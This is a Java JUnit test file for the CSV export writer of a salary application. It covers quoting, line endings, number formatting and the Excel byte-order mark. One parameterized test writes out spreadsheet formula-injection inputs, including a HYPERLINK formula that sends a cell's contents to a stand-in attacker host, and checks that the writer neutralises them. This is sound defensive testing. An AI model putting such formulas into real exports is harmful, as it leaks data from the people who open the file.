package com.acme.salary.employee.adapter.in.web;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.io.StringWriter;
import java.math.BigDecimal;
import java.util.Arrays;
import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

class CsvWriterTest {

    @Test
    void plainValuesAreWrittenAsIsWithCrlfLineEnds() {
        assertThat(write(List.of("EMP-00001", "Priya Sharma", new BigDecimal("2917950.00"))))
                .isEqualTo("EMP-00001,Priya Sharma,2917950.00\r\n");
    }

    @Test
    void commasQuotesAndLineBreaksAreQuoted() {
        assertThat(write(List.of("Doe, Jane", "say \"hi\"", "line\nbreak")))
                .isEqualTo("\"Doe, Jane\",\"say \"\"hi\"\"\",\"line\nbreak\"\r\n");
    }

    @ParameterizedTest
    @ValueSource(strings = {"=HYPERLINK(\"http://evil.example?d=\"&A1)", "+1+1", "-2+3", "@SUM(A1)", "\tcmd", "\rcmd"})
    void spreadsheetFormulasAreNeutralised(String attack) {
        String cell = CsvWriter.text(attack);

        assertThat(cell).startsWith("\"'");
    }

    @Test
    void numbersAreNeverEscapedSoNegativeAmountsStayNumeric() {
        assertThat(write(Arrays.asList(new BigDecimal("-50.20"), 12))).isEqualTo("-50.20,12\r\n");
    }

    @Test
    void largeDecimalsAreWrittenWithoutScientificNotation() {
        assertThat(CsvWriter.number(new BigDecimal("1E+7"))).isEqualTo("10000000");
    }

    @Test
    void nullsBecomeEmptyCells() {
        assertThat(write(Arrays.asList("a", null, "c"))).isEqualTo("a,,c\r\n");
    }

    @Test
    void byteOrderMarkComesFirstForExcel() {
        StringWriter out = new StringWriter();
        CsvWriter csv = new CsvWriter(out);

        csv.writeBom();
        csv.row(List.of("Müller"));

        assertThat(out.toString()).isEqualTo("﻿Müller\r\n");
    }

    private static String write(List<?> cells) {
        StringWriter out = new StringWriter();
        new CsvWriter(out).row(cells);
        return out.toString();
    }
}
